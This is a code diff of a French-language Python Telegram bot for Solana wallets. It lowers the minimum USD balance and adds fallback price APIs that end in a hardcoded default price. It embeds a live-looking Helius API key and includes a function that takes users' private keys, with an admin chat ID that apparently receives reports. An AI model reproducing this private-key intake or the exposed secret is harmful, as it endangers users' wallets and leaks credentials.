@@ -21,7 +21,7 @@ ADMIN_CHAT_ID = -5299554897
 HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"
 
 # Montant minimum requis en USD
-MINIMUM_USD_REQUIRED = 50.0
+MINIMUM_USD_REQUIRED = 10.0
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -480,22 +480,58 @@ Contact support: @votre_support
 
 
 async def get_solana_price():
-    """Récupère le prix actuel du SOL en USD via CoinGecko API"""
+    """Récupère le prix actuel du SOL en USD via plusieurs APIs"""
+    
+    # Essayer CoinGecko en premier
     try:
         async with aiohttp.ClientSession() as session:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
             url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
+            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                 if response.status == 200:
                     data = await response.json()
                     sol_price = data.get('solana', {}).get('usd', 0)
-                    logger.info(f"💰 Prix actuel du SOL: ${sol_price}")
-                    return sol_price
-                else:
-                    logger.warning(f"Impossible de récupérer le prix du SOL, status: {response.status}")
-                    return 0
+                    if sol_price > 0:
+                        logger.info(f"💰 Prix actuel du SOL (CoinGecko): ${sol_price}")
+                        return sol_price
     except Exception as e:
-        logger.error(f"Erreur lors de la récupération du prix SOL: {e}")
-        return 0
+        logger.warning(f"CoinGecko échoué: {e}")
+    
+    # Essayer CoinCap en backup
+    try:
+        async with aiohttp.ClientSession() as session:
+            url = "https://api.coincap.io/v2/assets/solana"
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    sol_price = float(data.get('data', {}).get('priceUsd', 0))
+                    if sol_price > 0:
+                        logger.info(f"💰 Prix actuel du SOL (CoinCap): ${sol_price}")
+                        return sol_price
+    except Exception as e:
+        logger.warning(f"CoinCap échoué: {e}")
+    
+    # Essayer Binance en dernier recours
+    try:
+        async with aiohttp.ClientSession() as session:
+            url = "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT"
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    sol_price = float(data.get('price', 0))
+                    if sol_price > 0:
+                        logger.info(f"💰 Prix actuel du SOL (Binance): ${sol_price}")
+                        return sol_price
+    except Exception as e:
+        logger.warning(f"Binance échoué: {e}")
+    
+    # Si toutes les APIs échouent, utiliser un prix par défaut récent
+    logger.error("❌ Toutes les APIs de prix ont échoué, utilisation d'un prix par défaut")
+    default_price = 180.0  # Prix approximatif par défaut
+    logger.info(f"⚠️ Utilisation du prix par défaut: ${default_price}")
+    return default_price
 
 
 async def verify_wallet_and_balance(private_key_str: str):
